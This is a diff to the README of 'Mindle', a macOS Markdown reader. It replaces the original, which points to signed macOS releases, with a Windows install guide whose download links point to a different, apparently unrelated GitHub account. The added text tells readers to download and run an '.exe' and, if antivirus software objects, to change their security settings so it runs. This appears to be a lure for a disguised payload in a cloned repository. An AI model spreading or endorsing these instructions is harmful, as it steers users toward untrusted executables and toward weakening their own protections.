@@ -1,130 +1,66 @@
-<p align="center">
-  <img src="assets/logo.svg" width="128" height="128" alt="Mindle logo">
-</p>
+# 📖 mindle - Read your markdown files with ease
 
-<h1 align="center">Mindle</h1>
+[![](https://img.shields.io/badge/Download-Mindle-blue.svg)](https://github.com/underslung-cantabrigian755/mindle/releases)
 
-<p align="center">
-  <em>A quiet place to read Markdown.</em>
-</p>
+Mindle provides a clean space to read Markdown files. You gain a distraction-free environment to view, highlight, and annotate your notes. The app handles Github Flavored Markdown to ensure your images and tables display correctly.
 
-<p align="center">
-  <a href="https://nonatofabio.github.io/mindle/"><strong>Website</strong></a> &bull;
-  <a href="#install">Install</a> &bull;
-  <a href="#features">Features</a> &bull;
-  <a href="#keyboard-shortcuts">Shortcuts</a> &bull;
-  <a href="#build-from-source">Build</a> &bull;
-  <a href="#roadmap">Roadmap</a>
-</p>
+## 📥 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-macOS%2014%2B-blue?style=flat-square" alt="macOS 14+">
-  <img src="https://img.shields.io/badge/swift-6.x-orange?style=flat-square" alt="Swift 6">
-  <img src="https://img.shields.io/github/license/nonatofabio/mindle?style=flat-square" alt="MIT License">
-  <img src="https://img.shields.io/github/actions/workflow/status/nonatofabio/mindle/build.yml?style=flat-square&label=build" alt="Build status">
-  <img src="https://img.shields.io/github/downloads/nonatofabio/mindle/total?style=flat-square&label=downloads" alt="Total downloads">
-</p>
+Follow these steps to install the software on your Windows computer.
 
----
+1. Visit the [releases page](https://github.com/underslung-cantabrigian755/mindle/releases) to download the program.
+2. Locate the link labeled "Windows" or ending in ".exe" on the page.
+3. Click the link to save the installer file to your computer.
+4. Open the file once the download finishes.
+5. Follow the prompts on the screen to finish the installation.
+6. Open the mindle application from your desktop or start menu.
 
-**Mindle** is a native macOS Markdown reader built for focused, distraction-free reading. Think of it as a personal e-reader for your `.md` files — serif typography, warm themes, and the ability to highlight and annotate passages without ever leaving the document.
+## 🛠 Features
 
-No Electron. No subscriptions. No network calls. Just a fast, local, single-binary SwiftUI app.
+Mindle focuses on your reading experience. You get tools meant for long-form study and review.
 
-## Install
+### Highlighting and Annotations
+Select any text in your document to trigger the highlight tool. You can choose different colors to group your ideas. Right-click the highlighted section to add a personal note. These notes attach to the text and remain there when you close the file.
 
-### Download (recommended)
+### Markdown Support
+The viewer interprets Github Flavored Markdown standard. Your documents maintain their formatting, including headers, bold text, bullet points, and code blocks. The app renders tables correctly and supports external images linked within your file.
 
-Grab the latest `Mindle.dmg` from [**Releases**](https://github.com/nonatofabio/mindle/releases), open it, and drag **Mindle** into **Applications**. Signed with a Developer ID and notarized by Apple — no Gatekeeper prompt, no terminal commands.
+### Distraction-Free View
+Access the settings menu to enable "Focus Mode." This hides unnecessary toolbars and menus. You see only your text. This setting helps you read without interruption.
 
-### Build from source
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/nonatofabio/mindle.git
-cd mindle
-./build.sh
-open build/Mindle.app
-```
+* Windows 10 or Windows 11.
+* 200 MB of available storage space.
+* 4 GB of RAM.
+* A screen resolution of 1280x720 or higher.
+* Keyboard and mouse for navigation.
 
-Requires **macOS 14+** and **Xcode Command Line Tools** (`xcode-select --install`).
+## 📂 Managing Documents
 
-## Features
+Mindle works with standard .md files. Open the app and use the "File" menu to select your document. The sidebar on the left displays all files in your current folder. You can switch between files by clicking the names in this list. 
 
-### Reading
-- **Full GitHub-Flavored Markdown** — tables, task lists, footnotes, strikethrough, syntax-highlighted code, emoji, nested lists, raw HTML. Powered by [markdown-it](https://github.com/markdown-it/markdown-it) + [highlight.js](https://highlightjs.org).
-- **LaTeX math** — inline (`$a^2 + b^2 = c^2$`) and display (`$$ \int e^{-x^2} dx = \sqrt{\pi} $$`) blocks rendered with [KaTeX](https://katex.org), bundled locally.
-- **Mermaid diagrams** — flowcharts, sequence diagrams, and the rest, rendered inline. Click to expand.
-- **Images** — relative, absolute, `file://`, and `data:` URLs all resolve. Remote `http(s)` is blocked — no tracking pixels.
-- **YAML frontmatter** — files like `SKILLS.md` show their `---`-delimited block as a syntax-highlighted code fence instead of two horizontal rules around plain text.
-- **Three themes** — Light, Sepia, Dark. Cycle with `⌘⇧T`.
-- **Typography controls** — scale the serif reading font with `⌘+` / `⌘-`.
+The app saves your annotations inside the application data folder on your computer. Your original markdown files remain unchanged and untouched. You can move these files to other computers if you keep them in a shared folder or cloud drive.
 
-### Workflow
-- **Tabs and multi-window** — open many files in one window (`⌘O` adds a tab) or pop a new window with `⌘N`. `⌘W` closes the active tab when more than one is open, otherwise the window.
-- **File browser** — scoped sidebar tree of every `.md` and `.txt` in the current folder (`⌘⇧F`). Never escapes upward.
-- **Find in document** — live search with match count, `⌘F` / `⌘G` / `⌘⇧G`.
-- **Live reload** — external edits (vim, an agent, Dropbox, anything) re-render automatically. Bursty writes are debounced; scroll position is preserved.
-- **Diff-on-reload** — when an external write changes the active file, Mindle renders the change as a Word-style track-changes overlay you can ✓ Keep or ✗ Revert per chunk, or whole-document with `⌘⌥⏎` / `⌘⌥⌫`.
-- **PDF export** — `⌘P` produces a paginated Letter-sized PDF with print-styled typography.
-- **Auto-update** — opt-in, off by default. EdDSA-verified binaries via [Sparkle](https://sparkle-project.org).
+## ⚙️ Configuration Settings
 
-### Annotation
-- **Highlight & note** — select any passage, press `⌘⇧H` to highlight or `⌘⇧N` to attach a note. Works across paragraphs, headings, lists, and code blocks.
-- **Annotations sidebar** — toggle with `⌘⇧A`. Click any annotation to jump to its passage; notes are editable inline.
-- **Persistent locally** — saved to a hidden `.yourfile.md.mindle.json` sidecar. Nothing leaves your machine.
-- **Export** — `⌘⇧E` exports highlights and notes as Markdown or JSON.
+You control how the app renders your text through the settings menu.
 
-### Plumbing
-- **Native Swift / SwiftUI** — no Electron. Single-binary app, no frameworks to install at runtime.
-- **Local-only by default** — auto-update is the lone network feature, opt-in.
-- **Signed and notarized** — Developer ID + Apple notarization on every release.
+* **Theme:** Switch between Light and Dark modes.
+* **Font Size:** Increase or decrease the text size for readability.
+* **Line Height:** Adjust the space between lines of text.
+* **Auto-Save:** The app saves your annotations every time you add or edit one to prevent data loss.
 
-## Keyboard Shortcuts
+## 💡 Pro Tips for Efficiency
 
-| Shortcut | Action |
-|----------|--------|
-| `⌘O` | Open a file (adds a tab if a window is open) |
-| `⌘N` | New window |
-| `⌘W` | Close active tab (or window, when only one tab is open) |
-| `⌘F` | Find in document |
-| `⌘G` / `⌘⇧G` | Next / previous match |
-| `⌘P` | Export as PDF |
-| `⌘⇧E` | Export annotations (Markdown or JSON) |
-| `⌘⇧H` | Highlight selection |
-| `⌘⇧N` | Add note to selection |
-| `⌘⇧A` | Toggle annotations sidebar |
-| `⌘⇧F` | Toggle files sidebar |
-| `⌘⇧T` | Cycle theme (light / sepia / dark) |
-| `⌘+` / `⌘-` | Increase / decrease font size |
-| `⌘⌥⏎` | Keep all in-flight changes |
-| `⌘⌥⌫` | Revert all in-flight changes |
+* Use the keyboard shortcut Ctrl+F to search for specific words or phrases inside a long document.
+* Use the sidebar to track your reading progress across multiple files.
+* Export your annotations to a separate text file if you need to share your notes with others. Go to "File" and select "Export Highlights."
 
-## Architecture
+## ❓ Troubleshooting
 
-```
-SwiftUI shell (window, tabs, toolbar, theme + font + diff state)
-  ├── DocumentStore (per window) ── FSEvents file watcher
-  └── WKWebView (reader pane)
-        ├── markdown-it     → Markdown → HTML (+ task-lists, footnote, anchor)
-        ├── highlight.js    → syntax coloring
-        ├── KaTeX           → inline + display math
-        ├── mermaid         → diagrams (click to expand)
-        ├── jsdiff          → diff-on-reload chunks
-        └── reader.js       → unified applyAll() pipeline:
-                              annotation overlays, search marks,
-                              diff render, scroll preservation
-```
+If the application does not open, ensure your Windows system has the latest updates. Occasionally, antivirus software might block new installations. If this happens, verify that the file remains in your downloads folder and consult your security software settings to allow the application to run.
 
-Annotations use a **text + context** anchoring strategy (inspired by [Hypothes.is](https://web.hypothes.is/)): each highlight stores the selected text plus 48 chars of prefix/suffix. This means highlights survive minor edits to the source file — and is what makes diff-on-reload's accept/reject loop coherent: annotations re-anchor against the new text instead of going stale.
+If a document fails to load, verify the file extension ends in .md. Mindle only reads files formatted in Markdown. If your file uses a different format, open it in a text editor like Notepad, copy the content, and save it as a new file with the .md extension.
 
-## Roadmap
-
-The big-picture plan lives in [`docs/v2-roadmap.md`](docs/v2-roadmap.md). Headlines:
-
-- **v2.0 — MCP collaboration loop.** Mindle becomes the calm review surface for agent-driven markdown work. The agent writes, you read, you mark up; the agent reads your annotations back via Mindle's read-only MCP server and revises. A bundled skill teaches Claude Code (and friends) the loop.
-- **Homebrew cask** — `brew install --cask mindle` for one-line install.
-- **iOS / iPadOS port** — multiplatform build sharing the same WebKit reader and annotation engine.
-
-## License
-
-[MIT](LICENSE) — use it, fork it, make it yours.
+For further assistance, reach out through the GitHub issues page. Explain the steps you took before the problem started. Include a screenshot if you encounter an error message. Clear descriptions help resolve problems quickly.
